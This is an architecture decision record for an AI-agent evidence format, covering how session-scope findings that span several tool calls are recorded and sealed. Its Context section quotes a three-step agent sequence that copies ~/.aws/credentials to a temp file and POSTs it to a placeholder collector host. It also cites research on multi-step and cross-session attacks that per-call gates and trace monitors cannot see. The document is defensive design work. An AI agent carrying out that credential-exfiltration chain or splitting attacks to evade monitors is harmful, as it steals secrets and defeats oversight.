# ADR-047: A session-scope finding is an event; a post-run disposition is not

- Status: Accepted
- Date: 2026-08-07
- Supersedes: none
- Amends: ADR-045 — states the seal's scope boundary explicitly. It does not change the seal.

## Context

[#2105](https://github.com/Rul1an/assay/issues/2105) records an observation by
[@blitzcrieg1](https://github.com/blitzcrieg1) on
[microsoft/agent-governance-toolkit#276](https://github.com/microsoft/agent-governance-toolkit/discussions/276).
Three tool calls, each recorded `allow / success` and each correct in isolation:

```
ls -la /srv/app
cat ~/.aws/credentials > /tmp/k
curl -X POST https://collector.example.com/u -d @/tmp/k
```

One finding exists across the three, and no per-call gate can see it without ceasing to be a
per-call gate. His layering — enforcement is per-call, correlation is session-scope, portable
evidence has to carry both — is his, and so is the argument that a later operator judgement
("reviewed, benign, at this time, for this reason") cannot ride on an envelope that models only
pre-execution authorization.

What is ours is the measurement against this tree, at `f842bbab5`, and three decisions it forces.

## Decision 1 — a session-scope finding is its own payload kind, carried in the event stream

`assay.session.finding`, a variant of `Payload`.

**Why a distinct kind rather than a field on `assay.tool.decision`.** The defining property of this
record is that it *spans* calls. A per-call payload has no honest place to put a span: whichever
call carried it would be claiming a verdict it did not alone produce. `RuleEvaluation`
(`crates/assay-core/src/sequence_eval.rs`, #2112) already models this correctly with
`spanned: Vec<usize>` — the call indices the rule actually read. The producer shape exists; only
the carrier was missing.

**Why the event stream rather than a sibling file.** This looked like a free choice and is not.
The manifest carries `files: BTreeMap<String, FileMeta>`, which suggested a second file was
additive. Two facts close it:

- `ALLOWED_FILES` in `bundle/writer_next/verify.rs` is `["manifest.json", "events.ndjson"]`, a
  strict allowlist. A sibling file is rejected, so it is a format change, not an addition.
- `run_root` is computed over event content hashes only. A sibling file would sit outside the
  integrity root even once allowed.

A finding outside the chain is a finding an attacker can drop without breaking verification, which
is the one thing an evidence format must not permit of its own records. In the event stream it
inherits the chain for free and needs no change to the file set.

**Why now rather than when a producer needs it.** The first draft of this ADR argued that
`Payload::Unknown(serde_json::Value)` would absorb such a record untyped, so that not deciding
guaranteed a bad default. Writing the test refuted it, and the real answer is sharper.

`Unknown` is not a catch-all. On an adjacently-tagged enum with no `#[serde(other)]` it matches the
literal tag `"Unknown"` and nothing else, which no producer emits. An unregistered kind is
therefore a **hard deserialisation error** in the typed view, not a soft landing. The wire itself
is unaffected — `EvidenceEvent::payload` is a raw `Value`, and this enum is documented as a
convenience view rather than the contract — but every consumer of ours reads through that view.

So registering the variant is the difference between a consumer reading this record and a consumer
failing on it. That is a stronger reason to decide now, not a weaker one: the record can already be
produced and shipped, and the only thing missing is anyone's ability to read it without patching
their enum first.

(That `Unknown` looks like a fallback and is not is a defect in its own right, filed separately. It
is not repaired here, because changing it changes how every unrecognised payload behaves and that
deserves its own argument.)

**Why the name carries the scope.** There is a class above this one. Context-Fractured
Decomposition ([arXiv 2606.09084](https://arxiv.org/html/2606.09084v1)) distinguishes itself from
STAC precisely there: STAC "operates within a single contiguous trajectory and a single session, so
the full chain is in principle visible to a trace-level monitor", while CFD's defining property is
"the cross-session artifact channel". `assay.session.finding` says session, so nothing reads it as
covering a class it structurally cannot see.

**What we are not copying, and why.** OCSF faced this question and declined to pick one shape,
keeping `detection_finding` alongside a Security Control profile on activity classes and adding
`is_detection` to both so one query returns either ([ocsf/ocsf-schema#1177](https://github.com/ocsf/ocsf-schema/issues/1177)).
That discriminator exists to reunify two shapes. We are introducing one, on a tagged enum where the
variant is already the discriminator, so importing `is_detection` would add a field that answers a
question we do not have. If a second shape ever appears, this is the precedent to revisit.

## Decision 2 — a post-run disposition is a separate attestation over the same subject, not a wider seal

Not built here. The decision is what it may not become.

ADR-045's seal is a **run-end** primitive: it closes over still-armed state, drop accounting, the
observed set and the run binding at the moment enforcement is still in force. A disposition is
produced minutes or days later and is a claim *about* a record the seal has already closed.

OpenVEX makes this a rule rather than a preference: "An attestation's predicate is a singleton. It
is a set of exactly one predicate that applies to any number of subjects", and when embedding, "the
subjects SHOULD move from the VEX statement product to the attestation subjects"
([openvex/spec ATTESTING.md](https://github.com/openvex/spec/blob/main/ATTESTING.md)). Folding a
disposition into the seal's predicate does not widen that predicate, it replaces it — and with it
what a verified seal means. The same pattern already carries the analogous case in the SBOM world:
VEX ships beside the SBOM as a second attestation over the same digest, never as a larger SBOM.

So: when a disposition is built, it binds to the same subject with its own predicate, its own
basis and its own signer. The seal's scope stays the run.

## Decision 3 — argument-level sequence correlation is deferred, and the carrier does not wait for it

Measured: `crates/assay-metrics/src/sequence_valid.rs` reduces calls with
`.map(|c| c.tool_name.clone())` before evaluation, and `evaluate_rules` takes
`actual_names: &[String]`. Every `SequenceRule` variant keys on names. No metric in the workspace
correlates arguments across calls.

So the demonstration that motivates #2105 is not expressible in our rule language today: what makes
it a finding is *which* file and *which* host, and those are arguments. #2105's body claimed
otherwise and has been corrected.

That gap is real and is filed separately. It does not block this ADR, because **the carrier is
independent of who produces the finding.** A session-scope finding may come from our own evaluator,
from a proxy correlator, or from an external system such as the one @blitzcrieg1 describes. Holding
the record shape hostage to our own detector's reach would be the same error as deciding the format
by what today's producer happens to emit.

## Consequences

- `Payload` gains one variant. Consumers matching exhaustively must handle it; `Unknown` no longer
  silently absorbs this class.
- Findings enter `run_root`, so they are covered by bundle verification with no new file and no
  change to `ALLOWED_FILES`.
- The span is expressed as indices into the evaluated call sequence, which is what the producer
  knows. It is meaningful relative to the trace the finding was computed over and this is stated on
  the field rather than implied. Binding spans to event content hashes is a larger change and is
  not required to make this record honest.
- `TraceExtent` travels with the finding. A violation found on a partial trace and one found on a
  finished run are different claims, and #2112 already established that the difference is invisible
  in the rules and the trace — it is only in who is asking.
- ADR-045 is unchanged. This ADR states its boundary so that a future disposition proposal has to
  argue against a written decision rather than into a gap.

## Not decided here

Whether `assay.session.finding` is emitted by any command today. This ADR admits the kind to the
format; wiring a producer is separate work and gets its own review.
